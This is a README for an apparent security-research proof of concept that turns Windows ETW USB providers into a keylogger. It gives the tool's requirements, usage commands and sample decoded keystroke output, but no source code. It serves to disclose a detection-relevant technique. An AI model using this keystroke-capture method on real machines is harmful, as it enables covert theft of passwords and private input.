# KeyloggerPOC

This is a POC demonstrating how ETW can be leveraged as a keylogger on Windows 7 and above. This is 
accomplished through the ETW providers Microsoft-Windows-USB-USBPORT and Microsoft-Windows-USB-UCX
and parsing the data to extract the relevant HID data.

## Requirements
Administrative privileges
Windows 7 (USB 2.0)
Windows 8+ (USB 2.0 and USB 3.0)

## Usage
To run the keylogger with the default session name (UsbKeylog) no arguments are required
c:\> ETWKeylogger.exe

Session names can be specified via CLI:
ETWKeylogger <session_name>

example

C:\>ETWKeylogger.exe Ruxcon2016

## sample output
```
20161006 05:16:21.340	02 00 17 00 00 00 00 00		T
20161006 05:16:21.660	00 00 0B 00 00 00 00 00		h
20161006 05:16:21.748	00 00 00 0C 00 00 00 00		i
20161006 05:16:21.828	00 00 00 16 00 00 00 00		s
20161006 05:16:21.957	00 00 2C 00 00 00 00 00		[SPACE]
20161006 05:16:22.028	00 00 00 0C 00 00 00 00		i
20161006 05:16:22.116	00 00 00 16 00 00 00 00		s
20161006 05:16:22.260	00 00 2C 00 00 00 00 00		[SPACE]
20161006 05:16:22.388	00 00 04 00 00 00 00 00		a
20161006 05:16:22.484	00 00 00 2C 00 00 00 00		[SPACE]
20161006 05:16:22.628	00 00 17 00 00 00 00 00		t
20161006 05:16:22.716	00 00 00 08 00 00 00 00		e
20161006 05:16:22.796	00 00 00 16 00 00 00 00		s
20161006 05:16:22.908	00 00 00 17 00 00 00 00		t
20161006 05:16:26.332	02 00 1E 00 00 00 00 00		!
20161006 05:16:26.548	02 00 1F 00 00 00 00 00		@
20161006 05:16:26.764	02 00 20 00 00 00 00 00		#
20161006 05:16:26.980	02 00 21 00 00 00 00 00		$
20161006 05:16:27.196	02 00 22 00 00 00 00 00		%
20161006 05:16:27.948	00 00 1E 00 00 00 00 00		1
20161006 05:16:28.132	00 00 1F 00 00 00 00 00		2
20161006 05:16:28.324	00 00 20 00 00 00 00 00		3
20161006 05:16:28.532	00 00 21 00 00 00 00 00		4
20161006 05:16:28.732	00 00 22 00 00 00 00 00		5
20161006 05:16:36.100	05 00 04 00 00 00 00 00		[CTL] [ALT] a
20161006 05:16:36.916	05 00 16 00 00 00 00 00		[CTL] [ALT] s
20161006 05:16:37.619	05 00 07 00 00 00 00 00		[CTL] [ALT] d
20161006 05:16:39.996	05 00 09 00 00 00 00 00		[CTL] [ALT] f
```

## Limitations
English (ASCII) keyboards only.
Full HID spec not supported (not all keys)
A few second delay. All dynamic ETW sessions are prone some kind of delay

## Known Issues
Multiple key strokes can appear on the same line
Some HID devices may send bogus data. This often appears as a function (F*) key.
